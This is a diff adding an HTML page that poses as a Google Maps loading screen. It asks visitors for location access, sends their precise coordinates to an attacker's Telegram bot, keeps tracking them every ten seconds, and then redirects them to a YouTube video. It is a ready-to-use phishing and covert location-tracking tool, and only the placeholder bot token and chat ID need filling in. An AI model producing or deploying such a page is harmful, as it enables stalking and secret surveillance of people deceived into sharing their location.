@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Maps - Location</title>
+</head>
+<body>
+    <h2>Loading Google Maps...</h2>
+    <p>Please allow location access to continue</p>
+    <div id="status" style="color:red;"></div>
+
+    <script>
+        // Your Telegram Bot Token (get from Step 4)
+        const TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE";
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        }
+
+        function trackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        
+                        const msg = `📍 EXACT LOCATION\nLat: ${lat}\nLng: ${lng}\nAccuracy: ${acc}m\nGoogle Maps: ${googleMapsLink}\nTime: ${new Date().toISOString()}`;
+                        
+                        sendToTelegram(msg);
+                        
+                        document.getElementById("status").innerHTML = 
+                            `Location found!<br>Lat: ${lat}<br>Lng: ${lng}<br>Accuracy: ${acc}m<br><a href="${googleMapsLink}" target="_blank">Open in Google Maps</a>`;
+                        
+                        // Redirect after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                        }, 3000);
+                    },
+                    function(error) {
+                        document.getElementById("status").innerHTML = 
+                            "❌ Location blocked! Please:\n1. Click the lock icon in the address bar\n2. Set Location to 'Allow'\n3. Refresh the page";
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            }
+        }
+
+        trackLocation();
+
+        // Try again every 2 seconds if blocked
+        setInterval(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        
+                        const msg = `📍 CONTINUOUS UPDATE\nLat: ${lat}\nLng: ${lng}\nAccuracy: ${acc}m\nGoogle Maps: ${googleMapsLink}\nTime: ${new Date().toISOString()}`;
+                        
+                        sendToTelegram(msg);
+                        
+                        document.getElementById("status").innerHTML = 
+                            `Location found!<br>Lat: ${lat}<br>Lng: ${lng}<br>Accuracy: ${acc}m<br><a href="${googleMapsLink}" target="_blank">Open in Google Maps</a>`;
+                    },
+                    function() {},
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            }
+        }, 10000); // Updates every 10 seconds for continuous tracking
+    </script>
+</body>
+</html>
